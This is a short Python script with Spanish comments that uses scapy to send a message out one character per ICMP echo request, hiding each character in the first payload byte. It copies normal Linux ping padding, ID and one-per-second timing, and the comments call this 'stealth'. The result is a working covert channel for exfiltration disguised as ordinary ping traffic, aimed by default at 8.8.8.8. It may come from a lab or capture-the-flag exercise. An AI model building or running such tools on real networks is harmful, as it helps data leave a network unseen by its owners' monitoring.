import sys
import time
import struct
from scapy.all import IP, ICMP, send

def send_stealth_ping(mensaje, destino="8.8.8.8"):
    # Mantenemos un ID coherente para toda la sesión (simulando el PID del proceso ping)
    icmp_id = 1234
    seq_num = 1
    
    # Relleno estándar del ping de Linux: desde 0x10 hasta 0x37 (40 bytes)
    padding = bytes(range(0x10, 0x38))
    
    for char in mensaje:
        # Generamos un timestamp de 8 bytes (simulando el comportamiento normal)
        ts = struct.pack("<Q", int(time.time() * 1000))
        
        # El modo stealth inyecta el carácter en el primer byte del payload.
        # Los siguientes 7 bytes mantienen la estructura del timestamp, seguido del padding.
        payload_data = char.encode('utf-8') + ts[1:8] + padding
        
        # Construimos el paquete IP e ICMP con los campos coherentes
        packet = IP(dst=destino)/ICMP(type=8, code=0, id=icmp_id, seq=seq_num)/payload_data
        
        # Enviamos el paquete sin mostrar los mensajes por defecto de scapy
        send(packet, verbose=False)
        print("Sent 1 packets.")
        
        seq_num += 1
        time.sleep(1) # Un ping por segundo para ser stealth

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Uso: python pingv4.py \"<mensaje_cifrado>\"")
        sys.exit(1)
        
    mensaje_cifrado = sys.argv[1]
    send_stealth_ping(mensaje_cifrado)